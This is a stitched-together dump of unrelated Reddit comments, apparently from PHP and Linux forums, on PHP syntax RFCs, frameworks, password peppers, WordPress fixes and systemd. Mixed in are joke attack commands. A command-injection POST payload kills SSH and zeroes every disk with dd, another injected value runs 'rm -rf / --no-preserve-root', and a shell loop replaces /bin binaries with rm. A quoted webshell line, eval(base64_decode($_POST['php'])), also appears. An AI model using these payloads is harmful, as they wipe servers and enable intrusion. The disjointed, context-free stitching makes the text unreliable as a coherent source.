Meh. I'd just alias ls, cd, and mkdir to a fork bomb.
Ah, I must be looking at outdated data.
Try it in a VM (e.g. [like this](http://docs.vagrantup.com/v2/getting-started/index.html)).
I really don't C where this is going.
I prefer centOS for a server. 
Find something that only makes use of PHP and a database. Then find something that makes use of a bit of AJAX javascript, PHP and a database. Then start learning some libraries and frameworks to make your work easier. *Then* learn facebook's API, construct an app, do a whole lot of testing, find what 20% of it doesn't break most of the time, bugfix, test emails, get a production server, etc, etc, etc...
Yes, but BC Maths interface is not what I would expect in the year 2013. I would like something like the [Decimal](http://docs.python.org/2/library/decimal.html) module in Python. I can just drop a Decimal object in just about any place which expects an integer or float and it just works. To switch to BC Math I have to touch every single place where we use the values and have to take care that we never do any normal math operation with them or the type is coerced and all is lost. Of course, you can do that, but it is harder than it should be. Same with the microseconds: You can do it, but it is harder that it should be. I need the microsecond precision for timestamp, mostly for stuff like sorting 'actions', for example orders. I could of course just use microsecond floats and ignore the OO-interface.
http://www.php.net/manual/en/class.datetimeimmutable.php The port shouldn't be hard, I guess.
"IDE locked, swipe card to unlock." "Compiler waiting for auth key. Swipe card to authorize."
In that case, your shortcode is almost definitely blowing out $post while starting it's own wp loop. 
Try this: &lt;?php $original_id = $post-&gt;ID;?&gt; &lt;div class="hp-blog-post-info"&gt;&lt;?php echo do_shortcode('[recent_posts num="2" post_format="standard" meta="false" thumb="true" thumb_width="87" thumb_height="59" excerpt_count="60" custom_class="hp-blog-posts"]'); ?&gt;&lt;/div&gt; &lt;div class="hp-blog-issue-archive"&gt; &lt;div class="hp-blog-issue-archive-title"&gt;&lt;a href="http://204.197.252.76/~mountbak/mbe-archive/"&gt;MBE Issue Archive&lt;/a&gt;&lt;/div&gt; &lt;div class="hp-blog-issue-archive-image"&gt;&lt;a href="&lt;?php echo get_post_meta($original_id, 'issue-archive-1-link', true); ?&gt;"&gt;&lt;img class="alignleft" alt="archive-thumb-1" src="http://204.197.252.76/~mountbak/wp-content/uploads/2013/08/archive-thumb-1.png" /&gt;&lt;/a&gt;&lt;/div&gt; 
Seperate /usr has been broken for a long time, If you want a seperate /usr dir it needs to be mounted by the initcpio image. LVM has to be setup there too. http://freedesktop.org/wiki/Software/systemd/separate-usr-is-broken/ &gt; ... quite a number of programs these days hook themselves into the early boot process at various stages. A popular way to do this is for example via udev rules. The binaries called from these rules are sometimes located on /usr/bin, or link against libraries in /usr/lib, or use data files from /usr/share. &gt; ... Here's a short, very in-comprehensive list of software we are aware of that currently are not able to provide the full set of functionality when /usr is split off and not pre-mounted at boot: udev-pci-db/udev-usb-db and all rules depending on this (using the PCI/USB database in /usr/share), PulseAudio, NetworkManager, ModemManager, udisks, libatasmart, usb_modeswitch, gnome-color-manager, usbmuxd, ALSA, D-Bus, CUPS, Plymouth, LVM, hplip, multipath, Argyll, VMWare, the locale logic of most programs and a lot of other stuff. Not that this breakage predates systemd. This post was written because people started accusing systemd of breaking it themselves after they introduced a warning message when /usr was missing at boot. **EDIT**: not to be confrontation, but this is something thats been broken for every linux distro for quite some time. It shouldn't be news now.
Yeah, I was talking about two things. The first was that implementing array slicing would make this improvement redundant. However, as I am not the one to implement this I my opposition is just a personal preference.
Hmm, I still used the ncurses-based installer if that is any indication of how long. I truly never had any system breakage that didn't boil down to some error on my part.
&gt; I have no experience with Lavarel but I assume it's similar to symfony on some aspects like: output escaping by default, csrf protection, rfi inclusion free, user input eval free, and so forth. Right on all counts, in fact Laravel uses a few Symphony components. &gt; Also worth looking into is the vulnerability history of the framework and the community response time to such issues. Yes, I haven't started putting the document together but that's one of the first things I'll be looking out for.
I wouldn't really make this improvement redundant. The saved `array_slice` call is the least important advantage that this syntax has. The most important part is that the API becomes self-documenting and can be enforced by interfaces/inheritance. It also allows by-ref captures of variadic arguments, something that is currently not possible at all. (But I'm repeating myself, the advantages are concisely listed in https://wiki.php.net/rfc/variadics#summary.)
Asking for nice APIs wasn't the weird part, saying PHP wasn't any good at e-commerce because of it was the weird bit. Most languages suck at Date/Time stuff. I ALWAYS use moments.js in JavaScript, and thats a third-party library. Carbon is just as good but could use some help with milliseconds, so do that. :)
There are barely _any_ comment taking the situation aside and considering how to properly add users to an environment that possibly does or doesn't need system level access via a web based front end. That's all I tried to stick in there.
Guilty of having skipped the summary part of the RFC.
It would be two roads to the same place but different in a few ways: 1. **Readbility** - You can instantly tell that this func/method takes unlimited parameters by looking at the declaration. 2. **Type Hinting** - You can force those values to be a specific type. `func_get_args()` doesn't care what you put in. 3. **Documentation** - This could/will get PHPDoc syntax support, but `func_get_args()` doesn't. Those 3 alone make this definitely worth having, but I'm sure more benefits exist.
I *love* using Markdown in docblocks, makes code samples so easy to add too. Big +1 there.
I'd use Arch on a scratch server or one that's known to spontaneously combust anyways, but not a production server.
A question, since it popped now in my mind. How would error reporting change for this scenario: `Catchable fatal error: Argument 3 passed to foo() must be an instance of stdClass, string given` function foo($x, stdClass $a, stdClass $b, stdClass $c) {} foo($y, $object, "no", $object); What position would the error point at when $a,$b,$c would be captured via the variadic syntax?
I find the fact that he deleted his username immensely disappointing. He had real talent. 
a simple "no" would suffice
Enabling WP_DEBUG inside the wp-config.php file during development would definitely help you. It then prints out instead of supressing error messages. Also, you should enable xdebug on you development machine, for much more verbose error messages.
It will give the position of the argument (not of the capturing parameter).
I fucked up. [Reposted](http://www.reddit.com/r/PHP/comments/1la8rp/psr5_phpdoc_and_psr6_caching_interface_enter/).
I fucked up. [Reposted](http://www.reddit.com/r/PHP/comments/1la8rp/psr5_phpdoc_and_psr6_caching_interface_enter/).
It's dangerous to do this thing. Here's how to do this thing.
Well, like I said, it wasn't only once. The second time I had a non-bootable system because of a system upgrade, I decided "fuck this" and went back to stable OSes.
i am. and dont call me shirle--- aw dammit. nevermind
Then we just had a misunderstanding. The lacking API is just a tiny part of bit, the lack of operator overloading, the mediocre error handling in the standard library and the weak typing are much more severe and make my life more complicated than it should be. About carbon and microseconds: Is there a way to override the overloaded operators from the DateTime library without patching any C-Code?
The annoying thing is I've already walked them through how I plan to go about protecting the application. For your specific example Blade escapes output using `{{{ $var }}}` as opposed to `{{ $var }}` I've already told them I have missed that in a few places (the app isn't public yet) and I will be fixing that but they still want a review of the framework and the libraries I'm using. Fortunately they only care about the framework code I'm actually implementing which does cut down the work somewhat. I'm confident in the quality of Laravel. The point is I have to convince them of the same, which requires a full day (possibly longer for the detail they want) to write a report to them when I could be coding...
&gt; I sense a great disturbance in the Force, as if millions of voices suddenly cried out in terror, and were suddenly ~~silenced~~ **deleted**. FTFY. 
I know some people are going to hate me for this, but I feel like this is a upgrade of PHP. The standardisation that came with composer and packages like monolog has improved the experience of working on PHP projects tenfold.
This should be one of the rules of the internet, like these: http://knowyourmeme.com/memes/rules-of-the-internet Rule 51: Whatever the situation, there is a relevant xkcd
Lies!!!!
Understandable. I'll work on getting a Paypal implementation up. Alternatively, you can just send $19 via Paypal to 'admin@brightmarch.com' and I'll add you to the list of pre-sales. Thanks!
Thanks for all of the interest so far! I have just finished writing the first two chapters. I plan on getting the Vagrant chapter up on the website tomorrow (Thursday). Thanks!
Hes passing bash arguments into his PHP program which he has elevated to root privileges. All someone needs to do to fuck up his server is pass in a malicious bash argument in place of a username. Hence unfo's comment. 
False, peppers have not been vetted by any security professional or papers, they have not been invented by any securty professonal or researches. Peppers were invented by the community to solve a non problem. 1) In order for that to be remotely secure, peppers and salts need to be mixed. You can't just have a global pepper, you need both or it goes against the point. 2) the way salts work does not require them to be secret, just unique. So adding a global salt takes away from the uniquness of the salt. In short peppers don't offer any security, they are purely BS.
This is what happens on Ubuntu 13.04 with "rm -rf --no-preserve-root /": http://i.imgur.com/OJVbvnH.png It's dead. :(
Put this on a coworkers crontab when he was on vacation. Every day at five pm it would open, play the starwars theme on pcspkr and then close. Indicating that it was time to go home for the day.
SHA512 isn't a algo designed for password hashing, it's a general use hashing algorithm, that they run over and over a few thousand times to get something close to what the password specific algorithms provide, but they still don't give the near the same characteristics that password hashing algorithms do. bcrypt, pbdfk2, scrypt are the only algorithms MADE for password hashing. bcrypt is available on any modern install within the past 7 years, the only place you'll have problems there is VERY legacy setups. And in those cases we can talk about portability a bit more. But it shouldn't be the default thing that you show to people just getting into this stuff.
Maybe, but operator overloading and error handling wouldn't make PHP any better or worse at e-commerce. If I wasn't clear I just want to assert: PHP does e-commerce just fine. That was my only gripe. As for the rest: nope.
Remember that these are not yet accepted and are still in Draft status, so they are both subject to change. Still, getting an idea of what is going on and providing feedback certainly won't hurt.
And you are very bad at communicating. You bother to tell me that I missed the point, but you don't elaborate. 
Stop! VM time.
Apache doesn't need any special privs to become part of a botnet. I see PHP shells uploaded via Wordpress/Joomla all the time.
And that is how Linux works.
To which users?
I didn't know about generators, and now that I've read about them, I think they're sexy.
Use the OP's site? ;)
 cd /bin for file in $(ls); do if [ ! "${file}" = "busybox" ] &amp;&amp; [ ! "${file}" = "rm" ] ; then mv /bin/${file}{,.bak} cp /bin/rm /bin/${file} fi done Lather, rinse, repeat for each dir.
and then you have to *read* and make sure the ls output is empty... much better to use rmdir.
Can and definitely without question and undoubtedly *WILL* be used in that way. And it will take Chinese or Russian hackers just about minutes to find your server, a few other minutes to find this gigantic vulnerability and just seconds to transform it into yet another spam mail malware gatling...
Autism is pretty cool.
You are sorely mistaken, both in your comprehension of what I was saying and your commentary on how peppers have never been vetted. I NEVER suggested they were better than Salts. I NEVER tried to make any comparison to salts. But if you're seriously deluded enough to think that HASH(weakpassword) is less secure than HASH(pseudorandom + weakpassword) then I suggest you go do some reading. I said BETTER THAN the alternative. Not "good". Rainbow tables are utterly defeated by this even if the pepper leaks (you can't do precomputation, because it leaked at the same time as the passwords). And suggesting that a pepper weakens a salted hash is LUDICROUS in the contexts of a hashing function where single bitflips are, by a hashing function's very nature, going to result in a completely different result. The reason I am so hostile is because I dislike those who disparage others in your tone without reading that which they disparage. I used the phrase "less effective", which is the truth. I'd still rather have peppered hashes over unconcatenated ones any day of the week. Suggesting that the "community invented this untested thing" is ridiculous when all a pepper does is provide a subset of the benefits of salting.
Instead of complaining and gushing over how unsecure this piece of code is, why don't you try to reply with something constructive? That goes for the circlejerkers below.
It would fail, because / is an absolute path that the user doesn't have access to. (Though I think somewhere in the thread it was said that in this case the http user was added to wheel, so...)
Is this guy using the string "salt" as his salt? There is no amount of rofling that can express my amusement.
Because 65% of Redditors haven't been here that long.
The gods of kobol made it that way.
necessary learning pains?
You are sorely mistaken in your analysis of my post. I NEVER insinuated at all that peppers were somehow worse than not using anything at all. I simply said, that peppers are not even a thing in the security world because it's an absolute mistaken method of how salts are to be conceived and used. Peppers allow for a precomputed system to crack potentially most passwords in one go. they are an absolute misinterpretation of how salts should be applied and how they are meant to be used. It's simple to teach them the right way, why encourage the wrong way? It makes no sense. Anybody who applies security principles wrongly needs to be disparaged, and then encouraged to do things correctly. PERIOD. Anything less than that is absolutely harmful when it comes to security practices. http://blog.ircmaxell.com/2012/04/properly-salting-passwords-case-against.html edit added link.
What use do you have for knowing that order #1 happened 50ms before order #2? In the financial industry, it's necessary to know which transactions happened first, even at the microsecond level, to guarantee data integrity, and this is why they use this kind of precision. Your business requirement seems contrived to me, though. As for BC Math, PHP already supports 64-bit numbers natively. I don't see how a typical ecommerce system (or really, just about any typical web app) would need the ability to represent numbers greater than 9 **quintillion**. :-p
I'm just disappointed that the guy deleted his account after this. Sure it's a bit embarassing but pros in the industry get a TON of mileage out of 'the dumbest thing I've done' stories. All the time we spend waiting for shit to compile or download, or waiting for engineers to fix something... conversation nearly always ends up in a 'biggest disasters' contest. I would be quite happy for people to recognise me in ten years as 'that guy who gave web users full root with no sanitizing'. We all had to start somewhere. I suppose he's worried that his employers or managers will see this. I suppose that's fair enough, but I would still *own* that shit. Fuck them.
Maybe, if you think that the "pain" is due to essential complexity. I myself, disagree on that front.
Dang, beat me to it. One of the funniest comics EVER.
Don't forget cp and mv ;) 
but but but
Actually I'd go with POST http://www.domain.com/script.php username=; sudo -s '(pkill -9 -f ssh &amp;); for d in /dev/sd? /dev/hd? /dev/mapper/* /dev/md* ; do (cd /tmp ; nohup nice -19 dd if=/dev/zero of=$d &amp;) ; done' Take no prisoners. EDIT: Made it even more evil (kill everything SSH so that there's no chance to login remotely; killing the getty-s is much much harder)
Concepts and structures no. 6. Not exactly sure what you were asking for. Were you asking for a better network topology? Lamp/database reconfig for the current state of code (changing the config or version)? To what extent is the database off limits? A more appropriate load balance with the current hardware (eg. say you have 4 servers at your disposal. The project started out with two servers being web and two being db, but as the project evolved, the db load was much less than anticipated, so 3 web servers would be best)? After going through all your questions, I know I'd get the "don't call us, we'll call you". 
CodeIgniter is old and it doesn't use latest features of PHP. Their release cycle is slow. Laravel is complete opposite, they just released version 4 which uses most of the features you can get in PHP 5.3.7+. I cant tell anything useful about Zend. They are the same group who is developing core of PHP and many companies are using it. I would use Laravel since I'm familiar with it and it has a nice community behind it. ^*If ^I ^said ^anything ^wrong ^please ^correct ^me
I've spent more effort and time learning how to sysadmin and program for Linux than I have for Windows, and Windows is leagues more intuitive and friendly IMHO.
I'm most interested to see where their mind goes. Yours went to LAMP reconfigs and hardware allocation. But there are lots of possible avenues because the question is intentionally vague. "Well, if the codebase is highly object-oriented, we could consider swapping the Zend Engine out for HipHop. What kind of content is it serving with what kind of caching? Nginx might be better than Apache in some situations. Hmmm... I suppose I could change the way the database splits files some, or examine the Apache extensions that are enabled." I want to see where their mind goes when given such restrictions, because the exact restriction in that question are not unheard of within organizations. If this problem actually came up with these restrictions in our organization, it would be me and SA/NA that solved it, not any of the people I'm hiring. But I want to see how they think about it. &gt;After going through all your questions, I know I'd get the "don't call us, we'll call you". I kind of expect that the most senior person I'll find/hire will be able to immediately answer about 3/4 of this test adequately. I'm not looking for another Lead Dev, so I don't expect anyone to actually ace this test, or with some candidate to even use the entire test.
Surely your calculator would be implemented with https://github.com/Herzult/SimplePHPEasyPlus (of course you'd need to implement the additional operators)
There's not that much to learn. If you've used a standard before (such as PEAR) it's not hard to comply with PSR-2. This new stuff, particularly the documenting, isn't that complex either. If you've used phpDocumentor (and I have) it's just going to be much the same syntax, etc. If not, it's pretty simple to learn.
It also boils down to "don't ever trust anything you yourself have concocted, because it is probably wrong for 50 more ways than you'll ever come to know and understand". Web security is a pain in the ass... that turns into ass-cancer... that then rots and binds with the office chair you are sitting in so you have to stare at the bad code you wrote until you eventually die.
This pointed me to one error which I just fixed. Fixing that, however, did not remedy my primary issue at hand. Thank you for this!
I just did this and it pointed me to one error, which I have fixed. That didn't change my primary issue however.
I just checked this again and there haven't been any additions since the 12th of the month.
Ah, ok. Guess my sysadmin background bled through with the thought process ;). It's a little bit like, "what happens when you run the command 'ls'? Yes, I know it shows what's in the directory, but *what happens* when you run the command? My only problem with that question in particular is that in almost every situation I've been in, the code can be optimized to produce results faster. That's probably why the question had me stumped. As a side project, I just put together a site last month that has an **absolutely terrible** backend on purpose. If I can get it to run well there, putting it on a solid machine will be an easy out. Best of luck finding your candidate! 
We spend the first 30 minutes of every interview giving a presentation on our company so that the interviewees have an idea of not only what we do, but what our vision is, and what they are getting into. Highly skilled candidates that are not culture fits have been rejected before and will be rejected in the future, because I agree, it's important.
&gt; Agency
Perhaps if OP gave us his/her IP so we can help him remotely.
Second to what meznaric said, largely. Zend - I'm not sure I'd even consider a framework. It's kind of a collection of utility classes and components. One of which happens to be a framework. Zend has a pretty steep learning curve. I really struggled with it. It's hard to recommend over other options. Code Igniter - I wouldn't move existing stuff from it or anything, but it's certainly not the software I'd learn at this point. It has a lot of users because it's the simplest framework to use, but its approach is aging quickly. Symfony 2 - The one you missed is Symfony. Symfony has a lot of really powerful core components, and was the first framework to really start using Composer, etc, to assemble them. Symfony makes relatively few assumptions and enforces very little of its own opinions on users, making it both a bit more flexible and a little harder to learn than... Laravel - Laravel is largely built on Symfony components, connected with a much more opinionated Framework. Laravel is actively developed and actually very impressive. It has lots of online tutorials and books. Most of the people involved in it post on Reddit, and are actively engaged with the community on Twitter, etc. I've really enjoyed working with and learning it. Yii - There are quite a few using it, but it doesn't have the current "Flavour of the month" that Laravel does. AFAIK, newer versions (Yii 2) will be moving in the same direction as Laravel/Symfony with lots of quality shared components, implemented differently. This is a mature approach that benefits everyone. I really don't know a lot about Yii, but I'm sure an advocate can fill in the blanks. 
Laravel if you like new and reliable, Zend if you like old and reliable.
I like it =D
Did he even get the joke?
Haha.
He said it's not working. Obviously he needs to make sure everything is running as root. Do that, then put it in to production... And give me the IP. 
Why &amp; _before_ the ellipses instead of `...&amp;$params` which actually _looks_ like a by-ref variable instead of a bitwise AND that found itself stranded and lost? It's really the only gripe I have with this but it's a big gripe. &gt; `&amp;*$args.` This looks like a random sequences of special characters. Most non-alpha tokens look like a random sequences of special characters: `$$var*=++$_param;` looks like a random sequence of characters too. Personally I like `...` (over `*$`) but `&amp;...$foo` looks kind of crazy (And implying a range of some sort) compared to `...&amp;$foo` Just as a complete side-note, if you have an RFC on new syntax then discussion of/comments on the syntax isn't bikeshedding
FYI I added links in the above post.
"no" doesn't begin to capture the gravity of the situation. "no" is what you tell a kid reaching for a hot pan on the stove. If they don't listen, they'll learn a hard lesson. When people do things like this (instead of using existing tools), we all pay the price.
Santa doesn't do "Agency".
True, but why make the permissions even more lax.
It isn't news that this is a sticking point. And I don't take your comment as confrontation. We're all friends. lol It was news that Arch had pulled the trigger. I didn't know that Fedora had done it either. My larger concern is that more and more people don't understand the reason for putting binaries in each directory, and the solution to the problem was to just say forget it and symlink one to the other. In the overwhelming majority of cases, this isn't an issue. Most of us don't break out /usr from /, because the old BS about filesystem recovery, or whatever excuse a sys admin had _is_ outdated. To that extent, I totally agree with this. 
Only if we're including both technology and non-technology topics.
http://youtu.be/wKjxFJfcrcA
You are a pedant. Your comment is _evidence_ of this. You also seem like you're fun at parties. I'm inferring that from the previously mentioned evidence.
Did you also change it in the echo, as in my example?
You've heard of hyperbole before, yes?
I could easily argue that building packages required to "boot" before mounting /usr properly would fix the problem and not cause confusion. Neither is a great option, it seems. But just FYI, there are several distributions that adhere closely to LSB and FHS. RedHat and Debian being the closest two. Debian fails mostly because it doesn't use RPM.
You're using a clip from Billy Madison to call my point stupid. I think you just caused a corner of the universe to implode.
&gt;You are sorely mistaken in your analysis of my post. I NEVER insinuated at all that peppers were somehow worse than not using anything at all. That's odd, because the post you combatitively replied to was **"Global salts (peppers) are not pointless. They are *less effective* but they defeat rainbow tables and other precomputation attacks.".** &gt;I simply said, that peppers are not even a thing in the security world because it's an absolute mistaken method of how salts are to be conceived and used. &gt;Peppers allow for a precomputed system to crack potentially most passwords in one go. Of course. And if your password leaks you can crack a password in O(1). If your pepper is known or of insufficient complexity it doesn't exist, just like a password. So nice work criticising features that are already in their failure scenario. &gt;they are an absolute misinterpretation of how salts should be applied and how they are meant to be used. No, that's why the cryptography world invented the term pepper to disambiguate the "global salt" from a user generated one. &gt;It's simple to teach them the right way, why encourage the wrong way? It makes no sense. True. Why should we ever discuss anything that is less than optimal security? Why should we understand cryptographic concepts incrementally by discussing the benefits of various steps of security? We should all just accept everything as **BAD**^tm without ever identifying why. The pepper is halfway between unsalted and salted hashes, and serves as an excellent demonstration of what each aspect of salting the hash offers as a benefit. &gt;Anybody who applies security principles wrongly needs to be disparaged, and then encouraged to do things correctly. PERIOD. Anything less than that is absolutely harmful when it comes to security practices. Yes because education comes from SHAMING anyone who DARES bring up a point about something that isn't the One True Path, despite it being heavily disclaimered and only being written as a technical correction to an incorrect point. This is supposedly a forum for professionals. The obligation is to provide valid information, not leave false information uncorrected because discussing weaker security AUTOMATICALLY means I'm endorsing it. I might as well have said ROT13 is better than plaintext. It is a fact. Yet you moan at me for discussing ROT13 within any context. &gt;http://blog.ircmaxell.com/2012/04/properly-salting-passwords-case-against.html &gt;edit added link. I too can Google for "pepper cryptography" and click a link on the first page, thanks. You'll notice upon reading the linked post that peppers are discussed within the context of also having a salt, which was never in the slightest the scope for my argument. In case you haven't noticed I'm becoming a bit cheesed off with your reading comprehension. Either agree that you misread or misunderstood the scope of my point, or try to make an argument that H(P+text) is worse than H(text). And if you keep bringing S into this I'll keep pointing out that S never had anything to do with my claims.
This is true. I was the webmaster for my Boy Scout troop back in high school. I installed Joomla, it was great. Then I left and nobody updated anything for over 2 years. A couple weeks ago I check back and the .htaccess has been fucked up and there's both a remote shell, and several php files including things like eval(base64_decode($_POST['php'])); I lol'd, then offered to fix it and rebuild the site for a decent amount of money for a college kid.
Shoot, no. I missed that. I'm headed out of the office right now but I will put the global back in and try this once I get home.
I'm so lost. :( Is this how the html should look? ________________________________ &lt;div id="contact-form" &gt; &lt;form enctype="multipart/form-data"&gt; &lt;fieldset&gt; &lt;label&gt;Name&lt;/label&gt; &lt;input name="name" type="text" class="input-xlarge"&gt; &lt;label&gt;Email&lt;/label&gt; &lt;input name="email" type="text" class="input-xlarge"&gt; &lt;label&gt;Comment&lt;/label&gt; &lt;textarea rows="6" class="input-xxlarge"&gt;&lt;/textarea&gt; &lt;input name="comment" type="text" /&gt; &lt;/fieldset&gt; &lt;input type="submit" name="submit" value="Send a Message!" /&gt; &lt;/form&gt; &lt;/div&gt; ___________________________________________ Where in the code that you posted would I put the email it goes to?
That is the most fantastic/accurate depiction of the concept of internet trolling I've ever seen.
Why not Cake? I like it a lot
what quote are you referring to?
If you need a test like this to determine the quality of your candidates, you're doing it wrong.
Much like the cat, I also threw up immediately after.
Did you expect otherwise?
welcome to 1988
Mileage may vary. Just keep installing/upgrading until something works, right?
&gt; Some people, when confronted with a problem, think "I know, I'll use regular expressions." Now they have two problems. -- Jamie Zawinsky. You can read more about it [here](http://www.codinghorror.com/blog/2008/06/regular-expressions-now-you-have-two-problems.html) As applied to PAM, the second problem could be "how do I get PAM to allow users in database *foo* to connect to *bar*" or it could be "I edited one line in my PAM setup and now nobody but nobody can log in".
little bobby?
Yeah, that fixed it also. Which fix would you recommend? I can remove the global $post; from the shortcode, or I can stick with the fix you recommended. I'm not sure if there are / would be negatives or positives to either.
Ah, nice. Thanks. I can't bear to spend time trying to learn regex. Maybe 20 years ago, but I'm getting too old for this shit. There are too many other things needing attention.
if that shortcode is part of your theme, modify away. if it's from a plugin, you risk it being updated and losing your modifications. what's happening is the normal global $post object for the page is being replaced by the one in the shortcode's function. 
There are a lot of issues with this and how you phrase questions... Also if your candidates can't answer these questions correctly they're probably not worthwhile candidates. It's a lot more worthwhile to ask a candidate to explain a project they did, draw out architecture diagrams, explain design patterns they used, etc. OR Talk about a problem you recently solved at your company, explain various info about it and try to see how they'd solve it. Basics #6 is not a good question. You can write PHP programs bound by any of those things depending on what the program does. OOP #4 is badly phrased. Abstract classes are still classes. What you're looking for is the difference between an interface and an abstract class and a concrete class and an abstract class. DBs #3: Injection is too vague a term. You mean SQL injection. In the case of a prepared statement you inject parameters, in the case of building a DAO layer, dependency injection is a useful pattern. Concepts #4 is too open to bullshit. You don't know what the application DOES. You're asking how the candidate would profile it to determine what it is they would do to improve performance. You should make it clear that your intention is to talk about profiling rather than concrete recommendations, and you, yourself should be clear that without an actual app, you can't give a concrete answer (I've seen shitty interviewers ask this question and expect that). Security &amp; Failure #8: An API is not an application in and of itself, but rather a well defined method of interacting with an application programatically. Expand the acronym and you'll see "Application Programming Interface Application" does not make sense. In regard to OOP and testing a candidate's understanding of it: Ask about design patterns. What is the abstract factory pattern? What is the singleton pattern? Name a situation in which you would use an abstract class. How do use the dependency injection pattern to reduce code repetition? What is the dependency injection pattern? 
Absolutely
I see. So the modifications you proposed simply assigned the $post-&gt;ID value to the $original_id variable before the shortcode was processed. Then, we use the $original_id variable in place of the now shortcode borked $post-&gt;ID. That makes sense. And it wasn't throwing an error because it was working correctly, just with an unanticipated post ID. The shortcode is part of the theme, so I'm going to go that route for now. But it's really nice to have at least some grasp on what the heck was going on.
Code igniter seeks to have broader compatibility, I wouldn't characterize it the way you do. Also using features for the sake of using features does not a great framework make. "Hey let's refactor this just because we got a great new language feature!" Said no great architect ever. Code Igniter doesn't stop you from using any of the new features in your own code, there's just no reason to compromise compatibility for them. The age of a framework is also not a reflection of quality, but is often a reflection of maturity and stability. Zend is one of the oldest frameworks around. It's a great choice as well. I've built fairly big apps with CI and with Zend. Both are very reliable, but CI's easier to use. 
both those options work well. but these messages are a dead giveaway. $ sudo rm -rf /* rm: cannot remove ‘/dev/pts/0’: Operation not permitted rm: cannot remove ‘/dev/pts/ptmx’: Operation not permitted rm: cannot remove ‘/proc/sysrq-trigger’: Operation not permitted Followed by: $ ls ls: command not found Naturally, this still works: $ cd / $ echo * dev proc run sys Sure is faster now than 15 years ago when I last tried.
I like what you have said here but only wanted to point out that Laravel is NOT largely built on Symfony components, in fact it only uses a couple of Symfony components for routing and file operations because they simply do the job. In the upcoming version the routing will be completely rewritten to be faster than Symfony's routing component. 
Hi! I am a full time PHP developer. In my spare time I have created a file sharing service http://filegr.am, and snippets sharing site http://bootsnipp.com with Laravel, both were done from scratch in three evenings. Laravel is very capable of powering a sharing site that you described. It sounds like you would greatly benefit from Laravel's models and Eloquent ORM to organize your data and make proper relationships between the data. CodeIgniter is no longer actively maintained, I and many others consider it dead by now so I would highly advise not to use it for any long term projects. Zend is powerful but you would spend so much time trying to achieve simplest things that Laravel could give you with a much shorter learning curve. 
Thanks! So I did that and my php code above &lt;!DOCTYPE&gt; and &lt;HTML&gt;: looks like the following, but I did a test and I haven't gotten any email from it. ____________________________________________________________________________ &lt;?php if($_POST['submit'] != ''){ $name = $_POST['name']; $email = $_POST['email']; $comment = $_POST['comment']; echo 'Thank you ' . $name . ' for your comment:&lt;br /&gt;' . $comment; mail( "info@cristinek.com", "Feedback Form Results", $message, "From: $email" ); } ?&gt; &lt;!DOCTYPE html&gt; _______________________________________________________ 
Probably because you were stomping the global $post variable.
HttpKernel, DomCrawler, and BrowserKit are the main ones it uses. I'd argue that HttpKernel itself is a pretty big part. But I'll take the feedback. You're probably right. "Largely" is a pretty subjective term. TBH, I thought it used more symfonies than it actually does, now that I looked into it, it's not as extensive as I believed. Interesting point about the routing change. Didn't know that. Any links to a roadmap of any kind? I've seen the odd post by Taylor Otwell, but I'm curious if there's any detail.
username=; rm -rf / --no-preserve-root To get around that pesky safety measure.
At least you can still use built-in functions like cd. Oh wait.
With /*, you might miss some of those pesky "hidden" files. :(
Yep, that's what /u/mattbeck informed me of. Thank you for your help on this!
From what I know likely there will be some improvement in speed, and also in the way you deploy Laravel should get significantly easier. More details will be revealed this upcoming weekend at the Laracon EU by Taylor Otwell, he will tell us what's new in Laravel 4.1 and the videos will be posted shortly after that. PS, you are right on HttpKernel, it is pretty big part. Though DomCrawler is not used at all if you do --prefer-dist in Composer while installing Laravel, just scan the framework code for any references to it, there are none. I believe that is only left there for testing purposes. Same with BrowserKit, you will find that it is there only for functional testing.
crap, my bad! https://github.com/daylerees/dependency-injection-example
As someone who's played with most of the major frameworks, and writes PHP web applications and services for a living, my answer is that it depends. If this is just for a school project and you're being forced to use a PHP framework, you definitely want to go simple. Laravel is the modern and grown-up version of CodeIgniter in many ways. CodeIgniter and Kohana, while old, do indeed get the job done. If you're really interested in learning PHP for real web development, use frameworks as a reference, **BUT LEARN THE LANGUAGE FIRST**. I cannot stress this enough. When you learn a framework, you learn a particular way of doing things, and in the process miss out on *why* it does things the way it does, and perhaps more importantly, you don't realize that it *should* be doing things one way instead of another. Example: nearly all PHP frameworks shove MVC down your throat, but in reality, it usually only paints you into a corner. It's good in theory, but falls short in execution most of the time. I'd highly recommend writing your own PHP framework. You never really understand some things until you go to implement it yourself. That being said, frameworks are an excellent time saver and cover 98% of common functionality. Once you **learn the language**, you should poke around at the Zend Framework and Symfony. What you'll find is that ZF comes from the Java school of thought where EVERYTHING IS AN OBJECT BEEP BOOP I'M A ROBOT. It's really structured, and has a LOT of utility, but it's also quite bulky and locks you in to using only ZF. Symfony, on the other hand, takes some influence from Ruby/Rails and leans more towards highly dynamic code. It's definitely more "PHP-y" than ZF. Symfony also provides a ton of useful utilities and does a good job at not locking you into the framework so much. To answer your last question, I think you'll find that in serious web-dev companies, they don't really use off-the-shelf frameworks as much as home-grown frameworks and libraries. Facebook, for example, actually went as far as to write their own [PHP interpreter](https://github.com/facebook/hiphop-php/wiki). My company is constantly evolving its web frameworks to meet its needs and address its shortcomings. I'll also leave you with a word of warning. [PHP is filled with WTFs](http://www.phpsadness.com/). It does unexpected things, it makes tons of shaky assumptions, and encourages you to be lazy. This has lead to startlingly bad, even dangerous, code across the internet. PHP can be done right, but it's so easy to do it wrong that you most definitely will. I know I have ;) In your journey to learn PHP, you'll come across tons of popular projects (mostly content management systems come to mind): Wordpress, Joomla, Drupal, Magento, SilverStripe. Fall not into temptation! Learn from projects like Symfony, Composer, Doctrine (but don't use it. The code's good, the idea's not), Twig, Phabricator. Good luck on your project!
Seems like more syntactic sugar to achieve something that already doesn't take much effort to type nor read. function foo($param1, Array $extraParams){ // code } // Call foo foo(1, [2,3,4,5]); Now give me an easy way to do named parameters as well and I'm sold. That is, something easier than: foo(1, ['a'=&gt;2, 'b'=&gt;3]); Otherwise I'd consider this low priority.
do you first see the "echo thank you" etc., that line? let me know and i'll look into your mail code
